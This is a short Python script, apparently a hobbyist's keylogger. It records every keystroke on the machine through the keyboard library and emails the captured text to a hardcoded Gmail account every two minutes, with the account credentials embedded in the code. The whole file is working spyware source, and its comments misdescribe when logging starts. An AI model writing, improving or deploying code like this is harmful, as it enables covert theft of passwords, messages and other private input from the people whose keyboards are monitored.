# This is my second keylogger
# This keylogger connects to a gmail account that I created with this purpose in mind
# When CTRL+C is pressed the logging begins and it does not stop until the program is manually stopped
# While it runs a copy of all keys tokes will be sent to the email I created every two minutes

import keyboard  # this is for logging keystrokes
import smtplib  # this is for sending an email

# These will be to assist with the timing of the reports
from threading import Timer
from datetime import datetime

send_report_every = 120  # This is in seconds so once every two minutes
email_address = "gimmeyoinfo@gmail.com"
email_password = "keylogging123"


class Keylogger:
    def __init__(self, interval, report_method="email"):
        self.interval = interval
        self.report_method = report_method  # This is the string that contains all keystrokes within 'self.interval'
        self.log = ""
        self.start_dt = datetime.now()  # records the start datetime
        self.end_dt = datetime.now()  # records the end datetime

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            # this will ensure special keys like ctrl and alt are not included
            if name == "space":
                name = " "  # inserts and actual space instead of the word 'space'
            elif name == "enter":
                name = "[ENTER]\n"  # creates a new line whenever 'enter' is pressed
            elif name == "decimal":
                name = "."  # adds a '.'
        self.log += name  # adds the key name to global 'self.log' variable

    def sendmail(self, email, password, message):
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)  # manages SMTP server connection
        server.starttls()  # Connects to the SMTP server as TLS mode
        server.login(email, password)  # to log in to the email account
        server.sendmail(email, email, message)  # sends the actual message
        server.quit()  # ends the session

    def report(self):
        if self.log:
           self.end_dt = datetime.now()  # if there is something to log it is reported
           if self.report_method == "email":
               self.sendmail(email_address, email_password, self.log)
           self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True  # ends when main thread ends
        timer.start()  # starts the timer

    def start(self):
        self.start_dt = datetime.now()  # records the starting date and time
        keyboard.on_release(callback=self.callback)   # this starts the keyloging
        self.report()  # this starts the reporting process
        keyboard.wait()  # blocks the current thread and waits until CTRL+C is pressed


if __name__ == "__main__":
    keylogger = Keylogger(interval=send_report_every, report_method="email")
    keylogger.start()








